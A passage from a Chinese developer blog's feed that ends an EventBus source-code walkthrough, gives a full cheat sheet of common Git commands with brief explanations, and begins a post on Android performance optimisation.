class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Unknown thread mode: "</span> + subscription.subscriberMethod.threadMode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就用到<code>ThreadMode</code>了：</p>
<ul>
<li>如果是PostThread，直接执行</li>
<li>如果是MainThread，判断当前线程，如果本来就是UI线程就直接执行，否则加入<code>mainThreadPoster</code>队列</li>
<li>如果是后台线程，如果当前是UI线程，加入<code>backgroundPoster</code>队列，否则直接执行</li>
<li>如果是Async，加入<code>asyncPoster</code>队列</li>
</ul>
<h1 id="u516D_u3001BackgroundPoster"><a href="#u516D_u3001BackgroundPoster" class="headerlink" title="六、BackgroundPoster"></a>六、BackgroundPoster</h1><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> PendingPostQueue queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(Subscription subscription, Object event)</span> </span>&#123;</span><br><span class="line">    PendingPost pendingPost = PendingPost.obtainPendingPost(subscription, event);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        queue.enqueue(pendingPost);</span><br><span class="line">        <span class="keyword">if</span> (!executorRunning) &#123;</span><br><span class="line">            executorRunning = <span class="keyword">true</span>;</span><br><span class="line">            EventBus.executorService.execute(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码比较简单，其实就是，待发送的事件被封装成了<code>PendingPost</code>对象，<code>PendingPostQueue</code>是一个<code>PendingPost</code>对象的队列，当<code>enqueue</code>时就把这个事件放到队列中，<code>BackgroundPoster</code>其实就是一个Runnable对象，当<code>enqueue</code>时，如果这个Runnable对象当前没被执行，就将<code>BackgroundPoster</code>加入EventBus中的一个线程池中，当<code>BackgroundPoster</code>被执行时，会依次取出队列中的事件进行派发。当长时间无事件时<code>BackgroundPoster</code>所属的线程被会销毁，下次再Post事件时再创建新的线程。</p>
<h1 id="u4E03_u3001HandlerPoster"><a href="#u4E03_u3001HandlerPoster" class="headerlink" title="七、HandlerPoster"></a>七、HandlerPoster</h1><p><code>mainThreadPoster</code>是一个<code>HandlerPoster</code>对象，<code>HandlerPoster</code>继承自<code>Handler</code>，构造函数中接收一个<code>Looper</code>对象，当向<code>HandlerPoster</code> enqueue事件时，会像<code>BackgroundPoster</code>一样把这个事件加入队列中， 只是如果当前没在派发消息就向自身发送Message</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">enqueue</span>(<span class="params">Subscription subscription, Object <span class="keyword">event</span></span>) </span>&#123;</span><br><span class="line">    PendingPost pendingPost = PendingPost.obtainPendingPost(subscription, <span class="keyword">event</span>);</span><br><span class="line">    synchronized (<span class="keyword">this</span>) &#123;</span><br><span class="line">        queue.enqueue(pendingPost);</span><br><span class="line">        <span class="keyword">if</span> (!handlerActive) &#123;</span><br><span class="line">            handlerActive = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (!sendMessage(obtainMessage())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> EventBusException(<span class="string">"Could not send handler message"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>handleMessage</code>中会依次取出队列中的消息交由<code>EventBus</code>直接调用事件处理函数，而<code>handleMessage</code>执行所在的线程就是构造函数中传进来的<code>Looper</code>所属的线程，在<code>EventBus</code>中构造<code>mainThreadPoster</code>时传进来的是MainLooper，所以会在UI线程中执行。</p>
<h1 id="u516B_u3001AsyncPoster"><a href="#u516B_u3001AsyncPoster" class="headerlink" title="八、AsyncPoster"></a>八、AsyncPoster</h1><p><code>AsyncPoster</code>就简单了，把每个事件都加入线程池中处理</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">enqueue</span>(<span class="params">Subscription subscription, Object <span class="keyword">event</span></span>) </span>&#123;</span><br><span class="line">    PendingPost pendingPost = PendingPost.obtainPendingPost(subscription, <span class="keyword">event</span>);</span><br><span class="line">    queue.enqueue(pendingPost);</span><br><span class="line">    EventBus.executorService.execute(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="u4E5D_u3001Stick_Event"><a href="#u4E5D_u3001Stick_Event" class="headerlink" title="九、Stick Event"></a>九、Stick Event</h1><p>通过<code>registerSticky</code>可以注册Stick事件处理函数，前面我们知道了，无论是<code>register</code>还是<code>registerSticky</code>最后都会调用<code>Subscribe</code>函数，在<code>Subscribe</code>中有这么一段代码：</p>
<p>也就是会根据事件类型从<code>stickyEvents</code>中查找是否有对应的事件，如果有，直接发送这个事件到这个订阅者。而这个事件是什么时候存起来的呢，同<code>register</code>与<code>registerSticky</code>一样，和<code>post</code>一起的还有一个<code>postSticky</code>函数：</p>
<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sticky) &#123;</span><br><span class="line">    <span class="keyword">Object</span> stickyEvent;</span><br><span class="line">    <span class="keyword">synchronized</span> (stickyEvents) &#123;</span><br><span class="line">        stickyEvent = stickyEvents.<span class="built_in">get</span>(eventType);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stickyEvent != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// If the subscriber is trying to abort the event, it will fail (event is not tracked in posting state)</span></span><br><span class="line">        <span class="comment">// --&gt; Strange corner case, which we don't take care of here.</span></span><br><span class="line">        postToSubscription(newSubscription, stickyEvent, Looper.getMainLooper() == Looper.myLooper());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当通过<code>postSticky</code>发送一个事件时，这个类型的事件的最后一次事件会被缓存起来，当有订阅者通过<code>registerSticky</code>注册时，会把之前缓存起来的这个事件直接发送给它。</p>
<h1 id="u4E8B_u4EF6_u4F18_u5148_u7EA7priority"><a href="#u4E8B_u4EF6_u4F18_u5148_u7EA7priority" class="headerlink" title="事件优先级priority"></a>事件优先级priority</h1><p><code>register</code>的函数重载中有一个可以指定订阅者的优先级，我们知道<code>EventBus</code>中有一个事件类型到List<subscription>的映射，在这个映射中，所有的Subscription是按priority排序的，这样当post事件时，优先级高的会先得到机会处理事件。</subscription></p>
<p>优先级的一个应用就事，高优先级的事件处理函数可以终于事件的传递，通过<code>cancelEventDelivery</code>方法，但有一点需要注意，<code>这个事件的ThreadMode必须是PostThread</code>，并且只能终于它在处理的事件。</p>
<p>缺点<br>无法进程间通信，如果一个应用内有多个进程的话就没办法了</p>
<p>注意事项及要点<br>同一个onEvent函数不能被注册两次，所以不能在一个类中注册同时还在父类中注册<br>当Post一个事件时，这个事件类的父类的事件也会被Post。<br>Post的事件无Subscriber处理时会Post <code>NoSubscriberEvent</code>事件，当调用Subscriber失败时会Post <code>SubscriberExceptionEvent</code>事件。</p>
<h1 id="u5176_u4ED6"><a href="#u5176_u4ED6" class="headerlink" title="其他"></a>其他</h1><p><code>EventBus</code>中还有个Util包，主要作用是可以通过<code>AsyncExecutor</code>执行一个Runnable，通过内部的RunnableEx(可以搜索异常的Runnable)当Runnable抛出异常时通过<code>EventBus</code>发消息显示错误对话框。</p>
]]></content>
    <summary type="html">
    <![CDATA[有空学习了一下EventBus,希望下个项目中可以试用下...]]>
    
    </summary>
    
      <category term="异步事件处理" scheme="http://www.xuanzhangjiong.xyz/tags/%E5%BC%82%E6%AD%A5%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86/"/>
    
      <category term="Android" scheme="http://www.xuanzhangjiong.xyz/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[常用Git命令清单]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/09/01/%E5%B8%B8%E7%94%A8Git%E5%91%BD%E4%BB%A4%E6%B8%85%E5%8D%95/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/09/01/常用Git命令清单/</id>
    <published>2015-09-01T13:07:23.000Z</published>
    <updated>2015-12-19T13:48:45.000Z</updated>
    <content type="html"><![CDATA[<p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/常用Git命令清单_1.jpg" alt=""></p>
<p>敲了N遍Git命令，还是很多记住住，今天看了一篇别人总结的Git命令，敲一遍，练练手吧。</p>
<p>一般来说，日常使用只要记住下图6个命令，就可以了。但是熟练使用，恐怕要记住60～100个命令。</p>
<p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/常用Git命令清单_2.png" alt=""><br><br></p>
<p>下面是我整理的常用 Git 命令清单。几个专用名词的译名如下。</p>
<ul>
<li>Workspace：工作区</li>
<li>Index / Stage：暂存区</li>
<li>Repository：仓库区（或本地仓库）</li>
<li>Remote：远程仓库</li>
</ul>
<h1 id="u4E00_u3001_u65B0_u5EFA_u4EE3_u7801_u5E93"><a href="#u4E00_u3001_u65B0_u5EFA_u4EE3_u7801_u5E93" class="headerlink" title="一、新建代码库"></a>一、新建代码库</h1><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在当前目录新建一个Git代码库</span></span><br><span class="line">$ git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个目录，将其初始化为Git代码库</span></span><br><span class="line">$ git init [project-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载一个项目和它的整个代码历史</span></span><br><span class="line">$ git <span class="keyword">clone</span> <span class="title">[url</span>]</span><br></pre></td></tr></table></figure>
<h1 id="u4E8C_u3001_u914D_u7F6E"><a href="#u4E8C_u3001_u914D_u7F6E" class="headerlink" title="二、配置"></a>二、配置</h1><p>Git的设置文件为<code>.gitconfig</code>，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git config --list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑Git配置文件</span></span><br><span class="line"><span class="variable">$ </span>git config -e [--global]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置提交代码时的用户信息</span></span><br><span class="line"><span class="variable">$ </span>git config [--global] user.name <span class="string">"[name]"</span></span><br><span class="line"><span class="variable">$ </span>git config [--global] user.email <span class="string">"[email address]"</span></span><br></pre></td></tr></table></figure></p>
<h1 id="u4E09_u3001_u589E_u52A0_uFF0F_u5220_u9664_u6587_u4EF6"><a href="#u4E09_u3001_u589E_u52A0_uFF0F_u5220_u9664_u6587_u4EF6" class="headerlink" title="三、增加／删除文件"></a>三、增加／删除文件</h1><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加指定文件到暂存区</span></span><br><span class="line"><span class="variable">$ </span>git add [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加指定目录到暂存区，包括子目录</span></span><br><span class="line"><span class="variable">$ </span>git add [dir]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加当前目录的所有文件到暂存区</span></span><br><span class="line"><span class="variable">$ </span>git add .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除工作区文件，并且将这次删除放入暂存区</span></span><br><span class="line"><span class="variable">$ </span>git rm [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止追踪指定文件，但该文件会保留在工作区</span></span><br><span class="line"><span class="variable">$ </span>git rm --cached [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改名文件，并且将这个改名放入暂存区</span></span><br><span class="line"><span class="variable">$ </span>git mv [file-original] [file-renamed]</span><br></pre></td></tr></table></figure>
<h1 id="u56DB_u3001_u4EE3_u7801_u63D0_u4EA4"><a href="#u56DB_u3001_u4EE3_u7801_u63D0_u4EA4" class="headerlink" title="四、代码提交"></a>四、代码提交</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 提交暂存区到仓库区</span><br><span class="line">$ git <span class="operator"><span class="keyword">commit</span> -<span class="keyword">m</span> [message]</span><br><span class="line"></span><br><span class="line"># 提交暂存区的指定文件到仓库区</span><br><span class="line">$ git <span class="keyword">commit</span> [file1] [file2] ... -<span class="keyword">m</span> [message]</span><br><span class="line"></span><br><span class="line"># 提交工作区自上次<span class="keyword">commit</span>之后的变化，直接到仓库区</span><br><span class="line">$ git <span class="keyword">commit</span> -a</span><br><span class="line"></span><br><span class="line"># 提交时显示所有diff信息</span><br><span class="line">$ git <span class="keyword">commit</span> -v</span><br><span class="line"></span><br><span class="line"># 使用一次新的<span class="keyword">commit</span>，替代上一次提交</span><br><span class="line"># 如果代码没有任何新变化，则用来改写上一次<span class="keyword">commit</span>的提交信息</span><br><span class="line">$ git <span class="keyword">commit</span> <span class="comment">--amend -m [message]</span></span><br><span class="line"></span><br><span class="line"># 重做上一次<span class="keyword">commit</span>，并包括指定文件的新变化</span><br><span class="line">$ git <span class="keyword">commit</span> <span class="comment">--amend [file1] [file2] ...</span></span></span><br></pre></td></tr></table></figure>
<h1 id="u4E94_u3001_u5206_u652F"><a href="#u4E94_u3001_u5206_u652F" class="headerlink" title="五、分支"></a>五、分支</h1><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有本地分支</span></span><br><span class="line"><span class="variable">$ </span>git branch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有远程分支</span></span><br><span class="line"><span class="variable">$ </span>git branch -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有本地分支和远程分支</span></span><br><span class="line"><span class="variable">$ </span>git branch -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，但依然停留在当前分支</span></span><br><span class="line"><span class="variable">$ </span>git branch [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，并切换到该分支</span></span><br><span class="line"><span class="variable">$ </span>git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，指向指定commit</span></span><br><span class="line"><span class="variable">$ </span>git branch [branch] [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，与指定的远程分支建立追踪关系</span></span><br><span class="line"><span class="variable">$ </span>git branch --track [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到指定分支，并更新工作区</span></span><br><span class="line"><span class="variable">$ </span>git checkout [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立追踪关系，在现有分支与指定的远程分支之间</span></span><br><span class="line"><span class="variable">$ </span>git branch --set-upstream [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并指定分支到当前分支</span></span><br><span class="line"><span class="variable">$ </span>git merge [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择一个commit，合并进当前分支</span></span><br><span class="line"><span class="variable">$ </span>git cherry-pick [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除分支</span></span><br><span class="line"><span class="variable">$ </span>git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除远程分支</span></span><br><span class="line"><span class="variable">$ </span>git push origin --delete [branch-name]</span><br><span class="line"><span class="variable">$ </span>git branch -dr [remote/branch]</span><br></pre></td></tr></table></figure>
<h1 id="u516D_u3001_u6807_u7B7E"><a href="#u516D_u3001_u6807_u7B7E" class="headerlink" title="六、标签"></a>六、标签</h1><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有tag</span></span><br><span class="line">$ git <span class="keyword">tag</span></span><br><span class="line"></span><br><span class="line"><span class="title"># 新建一个tag</span>在当前commit</span><br><span class="line">$ git <span class="keyword">tag</span> <span class="title">[tag</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个tag在指定commit</span></span><br><span class="line">$ git <span class="keyword">tag</span> <span class="title">[tag</span>] [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看tag信息</span></span><br><span class="line">$ git show [<span class="operator">tag</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交指定tag</span></span><br><span class="line">$ git push [remote] [<span class="operator">tag</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交所有tag</span></span><br><span class="line">$ git push [remote] --tags</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，指向某个tag</span></span><br><span class="line">$ git checkout -b [branch] [<span class="operator">tag</span>]</span><br></pre></td></tr></table></figure>
<h1 id="u4E03_u3001_u67E5_u770B_u4FE1_u606F"><a href="#u4E03_u3001_u67E5_u770B_u4FE1_u606F" class="headerlink" title="七、查看信息"></a>七、查看信息</h1><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示有变更的文件</span></span><br><span class="line"><span class="variable">$ </span>git status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示当前分支的版本历史</span></span><br><span class="line"><span class="variable">$ </span>git log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示commit历史，以及每次commit发生变更的文件</span></span><br><span class="line"><span class="variable">$ </span>git log --stat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个文件的版本历史，包括文件改名</span></span><br><span class="line"><span class="variable">$ </span>git log --follow [file]</span><br><span class="line"><span class="variable">$ </span>git whatchanged [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示指定文件相关的每一次diff</span></span><br><span class="line"><span class="variable">$ </span>git log -p [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示指定文件是什么人在什么时间修改过</span></span><br><span class="line"><span class="variable">$ </span>git blame [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示暂存区和工作区的差异</span></span><br><span class="line"><span class="variable">$ </span>git diff</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示暂存区和上一个commit的差异</span></span><br><span class="line"><span class="variable">$ </span>git diff --cached [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示工作区与当前分支最新commit之间的差异</span></span><br><span class="line"><span class="variable">$ </span>git diff <span class="constant">HEAD</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示两次提交之间的差异</span></span><br><span class="line"><span class="variable">$ </span>git diff [first-branch]...[second-branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某次提交的元数据和内容变化</span></span><br><span class="line"><span class="variable">$ </span>git show [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某次提交发生变化的文件</span></span><br><span class="line"><span class="variable">$ </span>git show --name-only [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某次提交时，某个文件的内容</span></span><br><span class="line"><span class="variable">$ </span>git show [commit]:[filename]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示当前分支的最近几次提交</span></span><br><span class="line"><span class="variable">$ </span>git reflog</span><br></pre></td></tr></table></figure>
<h1 id="u516B_u3001_u8FDC_u7A0B_u540C_u6B65"><a href="#u516B_u3001_u8FDC_u7A0B_u540C_u6B65" class="headerlink" title="八、远程同步"></a>八、远程同步</h1><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载远程仓库的所有变动</span></span><br><span class="line"><span class="variable">$ </span>git fetch [remote]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示所有远程仓库</span></span><br><span class="line"><span class="variable">$ </span>git remote -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个远程仓库的信息</span></span><br><span class="line"><span class="variable">$ </span>git remote show [remote]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加一个新的远程仓库，并命名</span></span><br><span class="line"><span class="variable">$ </span>git remote add [shortname] [url]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取回远程仓库的变化，并与本地分支合并</span></span><br><span class="line"><span class="variable">$ </span>git pull [remote] [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传本地指定分支到远程仓库</span></span><br><span class="line"><span class="variable">$ </span>git push [remote] [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强行推送当前分支到远程仓库，即使有冲突</span></span><br><span class="line"><span class="variable">$ </span>git push [remote] --force</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送所有分支到远程仓库</span></span><br><span class="line"><span class="variable">$ </span>git push [remote] --all</span><br></pre></td></tr></table></figure>
<h1 id="u4E5D_u3001_u64A4_u9500"><a href="#u4E5D_u3001_u64A4_u9500" class="headerlink" title="九、撤销"></a>九、撤销</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># 恢复暂存区的指定文件到工作区</span><br><span class="line">$ git checkout [file]</span><br><span class="line"></span><br><span class="line"># 恢复某个<span class="operator"><span class="keyword">commit</span>的指定文件到工作区</span><br><span class="line">$ git checkout [<span class="keyword">commit</span>] [<span class="keyword">file</span>]</span><br><span class="line"></span><br><span class="line"># 恢复上一个<span class="keyword">commit</span>的所有文件到工作区</span><br><span class="line">$ git checkout .</span><br><span class="line"></span><br><span class="line"># 重置暂存区的指定文件，与上一次<span class="keyword">commit</span>保持一致，但工作区不变</span><br><span class="line">$ git <span class="keyword">reset</span> [<span class="keyword">file</span>]</span><br><span class="line"></span><br><span class="line"># 重置暂存区与工作区，与上一次<span class="keyword">commit</span>保持一致</span><br><span class="line">$ git <span class="keyword">reset</span> <span class="comment">--hard</span></span><br><span class="line"></span><br><span class="line"># 重置当前分支的指针为指定<span class="keyword">commit</span>，同时重置暂存区，但工作区不变</span><br><span class="line">$ git <span class="keyword">reset</span> [<span class="keyword">commit</span>]</span><br><span class="line"></span><br><span class="line"># 重置当前分支的<span class="keyword">HEAD</span>为指定<span class="keyword">commit</span>，同时重置暂存区和工作区，与指定<span class="keyword">commit</span>一致</span><br><span class="line">$ git <span class="keyword">reset</span> <span class="comment">--hard [commit]</span></span><br><span class="line"></span><br><span class="line"># 重置当前<span class="keyword">HEAD</span>为指定<span class="keyword">commit</span>，但保持暂存区和工作区不变</span><br><span class="line">$ git <span class="keyword">reset</span> <span class="comment">--keep [commit]</span></span><br><span class="line"></span><br><span class="line"># 新建一个<span class="keyword">commit</span>，用来撤销指定<span class="keyword">commit</span></span><br><span class="line"># 后者的所有变化都将被前者抵消，并且应用到当前分支</span><br><span class="line">$ git revert [<span class="keyword">commit</span>]</span></span><br></pre></td></tr></table></figure>
<h1 id="u5341_u3001_u5176_u4ED6"><a href="#u5341_u3001_u5176_u4ED6" class="headerlink" title="十、其他"></a>十、其他</h1><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成一个可供发布的压缩包</span></span><br><span class="line"><span class="variable">$ </span>git archive</span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[看到别人写的挺好的，拿来敲一边，就当回顾总结吧，哈哈，太机智了...]]>
    
    </summary>
    
      <category term="码农必备常识" scheme="http://www.xuanzhangjiong.xyz/tags/%E7%A0%81%E5%86%9C%E5%BF%85%E5%A4%87%E5%B8%B8%E8%AF%86/"/>
    
      <category term="Git" scheme="http://www.xuanzhangjiong.xyz/categories/Git/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Android性能优化]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/08/23/Android%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/08/23/Android性能优化/</id>
    <published>2015-08-23T08:08:49.000Z</published>
    <updated>2016-01-08T08:12:31.000Z</updated>
    <content type="html"><![CDATA[<p>1.UI卡顿有可能是UI布局过于复杂，无法在16ms内绘制一帧导致；可以使用HierarchyViewer来查找布局是否过于复杂，还可以使用TraceView来观察CPU的执行情况，更加快捷的找到性能瓶颈。</p>
